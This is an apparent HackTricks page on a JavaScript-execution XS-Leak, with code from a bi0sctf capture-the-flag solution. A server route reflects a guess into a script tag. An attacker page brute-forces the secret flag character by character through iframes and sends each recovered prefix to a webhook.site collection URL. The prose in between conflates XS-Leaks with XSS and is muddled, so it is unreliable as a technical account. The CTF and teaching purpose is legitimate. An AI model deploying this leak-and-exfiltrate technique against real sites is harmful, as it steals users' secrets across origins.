# JavaScript Execution XS Leak

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```javascript
// Code that will try ${guess} as flag (need rest of the server code
app.get('/guessing', function(req, res) {
let guess = req.query.guess
let page = `<html>
<head>
<script>
function foo() {
// If not the flag this will be executed
window.parent.foo()
}
</script>
<script src="https://axol.space/search?query=${guess}&hint=foo()"></script>
</head>
<p>hello2</p>
</html>`
res.send(page)
});
```
# XS-Leak - JavaScript Execution

## Introduction

XS-Leak is a technique that allows an attacker to extract sensitive information from a victim's browser by exploiting Cross-Site Scripting (XSS) vulnerabilities. By injecting malicious JavaScript code into a vulnerable web application, an attacker can execute arbitrary code in the victim's browser and leak sensitive information.

## JavaScript Execution

One common scenario where XS-Leak can be exploited is when a web application generates iframes to test different possibilities. For example, a main page may generate iframes to a previous `/guessing` page to test each possibility. The main page may use JavaScript to dynamically generate the iframes and execute code within them.

An attacker can take advantage of this scenario by injecting malicious JavaScript code into the main page. This code can be designed to extract sensitive information from the `/guessing` page and send it to an attacker-controlled server. The injected code will be executed within the iframes, allowing the attacker to access and leak the sensitive information.

## Example

Here is an example of how XS-Leak can be exploited in this scenario:

1. The main page generates iframes to the `/guessing` page, each with a different parameter to test different possibilities.
2. The main page uses JavaScript to dynamically generate the iframes and execute code within them.
3. An attacker identifies a XSS vulnerability in the main page and injects malicious JavaScript code.
4. The injected code is designed to extract sensitive information from the `/guessing` page and send it to an attacker-controlled server.
5. When the main page generates the iframes, the injected code is executed within each iframe.
6. The injected code extracts the sensitive information from each `/guessing` page and sends it to the attacker-controlled server.
7. The attacker receives the leaked sensitive information and can use it for further exploitation.

## Mitigation

To mitigate XS-Leak vulnerabilities, it is important to properly sanitize and validate user input to prevent XSS attacks. Additionally, web application developers should avoid dynamically generating iframes with user-controlled input, as this can introduce security risks. Regular security testing and code reviews can help identify and fix XSS vulnerabilities before they can be exploited.
```html
<html>
<head>
<script>
let candidateIsGood = false;
let candidate = ''
let flag = 'bi0sctf{'
let guessIndex = -1

let flagChars = '_0123456789abcdefghijklmnopqrstuvwxyz}ABCDEFGHIJKLMNOPQRSTUVWXYZ'

// this will get called from our iframe IF the candidate is WRONG
function foo() {
candidateIsGood = false
}

timerId = setInterval(() => {
if (candidateIsGood) {
flag = candidate
guessIndex = -1
fetch('https://webhook.site/<yours-goes-here>?flag='+flag)
}

//Start with true and will be change to false if wrong
candidateIsGood = true
guessIndex++
if (guessIndex >= flagChars.length) {
fetch('https://webhook.site/<yours-goes-here>')
return
}
let guess = flagChars[guessIndex]
candidate = flag + guess
let iframe = `<iframe src="/guessing?guess=${encodeURIComponent(candidate)}"></iframe>`
console.log('iframe: ', iframe)
hack.innerHTML = iframe
}
, 500);
</script>
</head>
<p>hello</p>
<div id="hack">
</div>
</html>
```
<details>

<summary><strong>qaStaHvIS AWS hacking vItlhlaHbe'chugh</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **qaStaHvIS** **cybersecurity company** vaj **tlhap HackTricks** **company advertise** vItlhutlh? be'vaj **PEASS latest version** **download HackTricks PDF** vItlhutlh? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **check**!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) **Discover** maH, **exclusive NFTs** [**collection**](https://opensea.io/collection/the-peass-family) jImej!
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) **Get**!
* [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) **Join** vaj [**telegram group**](https://t.me/peass) **follow** **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **hacking tricks** **Share** **submitting PRs** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
